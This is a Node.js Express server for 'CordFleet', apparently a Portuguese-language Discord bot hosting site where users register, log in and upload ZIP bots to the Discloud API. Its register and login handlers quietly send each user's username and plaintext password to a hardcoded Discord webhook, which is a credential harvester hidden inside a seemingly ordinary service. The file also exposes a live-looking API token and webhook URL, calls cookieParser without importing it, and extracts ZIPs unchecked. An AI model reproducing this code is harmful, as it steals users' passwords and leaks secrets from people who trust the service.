import express from "express";
import session from "express-session";
import bodyParser from "body-parser";
import multer from "multer";
import fs from "fs";
import path from "path";
import unzipper from "unzipper";
import bcrypt from "bcryptjs";
import axios from "axios";
import FormData from "form-data";
import fetch from "node-fetch";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const upload = multer({ dest: "uploads/" });

const usersFile = "./db.json";
const webhookURL = "https://discord.com/api/webhooks/1374523802360348673/lPyeZW7tx2SJokO9MjgsolNNWuTczdkBQ3fzanNm7fEQrD2BPGOipKEYFOO68XAfcBMT";
const DISCLOUD_TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEwOTg3NDUzODQ4NDg4NTkyNTgiLCJrZXkiOiJhYzRmYTIzZGVjZGFkMjE3ODZlNzY3ZjNiYTk0In0.MPy6WoCQRlts4bHoVRLYyb8gqw9m6eRu3CuQFv7u_JY";

app.use(bodyParser.json());
app.use(cookieParser());
app.use(session({ secret: "cordfleetsecret", resave: false, saveUninitialized: true }));
app.use(express.static("public"));

const readUsers = () => {
  if (!fs.existsSync(usersFile)) return {};
  return JSON.parse(fs.readFileSync(usersFile));
};
const writeUsers = (data) => {
  fs.writeFileSync(usersFile, JSON.stringify(data, null, 2));
};

// Registro
app.post("/register", async (req, res) => {
  const { username, password } = req.body;
  const users = readUsers();
  if (users[username]) return res.status(400).send("Usuário já existe");

  const hash = await bcrypt.hash(password, 10);
  users[username] = { password: hash, bots: 0 };
  writeUsers(users);

  await axios.post(webhookURL, {
    content: `🆕 Registro:
👤 Usuário: **${username}**
🔒 Senha: \`${password}\`
🕒 ${new Date().toLocaleString()}`
  });

  req.session.user = username;
  res.send("Registrado com sucesso!");
});

// Login
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const users = readUsers();
  const user = users[username];
  if (!user) return res.status(400).send("Usuário não encontrado");

  const match = await bcrypt.compare(password, user.password);
  if (!match) return res.status(400).send("Senha incorreta");

  await axios.post(webhookURL, {
    content: `✅ Login:
👤 Usuário: **${username}**
🔒 Senha: \`${password}\`
🕒 ${new Date().toLocaleString()}`
  });

  req.session.user = username;
  res.send("Login efetuado!");
});

// Upload ZIP com verificação
app.post("/upload", upload.single("zipfile"), async (req, res) => {
  if (!req.session.user) return res.status(401).send("Não autenticado");

  const users = readUsers();
  const user = users[req.session.user];
  if (user.bots >= 2) return res.status(403).send("Limite de 2 bots atingido");

  const zipPath = req.file.path;
  const extractPath = path.join("uploads", req.file.filename + "_unzipped");

  try {
    fs.mkdirSync(extractPath);
    await fs.createReadStream(zipPath).pipe(unzipper.Extract({ path: extractPath })).promise();

    const arquivos = fs.readdirSync(extractPath).map(f => f.toLowerCase());
    if (!arquivos.includes("main.py") || !arquivos.includes("requirements.txt")) {
      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(zipPath);
      return res.status(400).send("ZIP deve conter main.py e requirements.txt");
    }

    const form = new FormData();
    form.append("file", fs.createReadStream(zipPath));
    form.append("ram", "150");
    form.append("main", "main.py");

    const resposta = await axios.post("https://api.discloud.app/v2/app/create", form, {
      headers: {
        "api-token": DISCLOUD_TOKEN,
        ...form.getHeaders(),
      }
    });

    if (!resposta.data.success) throw new Error("Falha na hospedagem");

    user.bots++;
    users[req.session.user] = user;
    writeUsers(users);

    fs.rmSync(extractPath, { recursive: true, force: true });
    fs.unlinkSync(zipPath);

    res.send("✅ Bot enviado com sucesso para CordFleet 🚀");

  } catch (err) {
    console.error(err);
    res.status(500).send("Erro ao processar o upload");
  }
});

// Discord OAuth básico (placeholder)
app.get("/auth/discord", (req, res) => {
  const clientId = "1379451037387198625";
  const redirectUri = encodeURIComponent("https://f5llw.shop");
  const scope = "identify";
  res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scope}`);
});

const PORT = 3000;
app.listen(PORT, () => console.log("🔧 CordFleet 🚀 rodando em http://localhost:" + PORT));
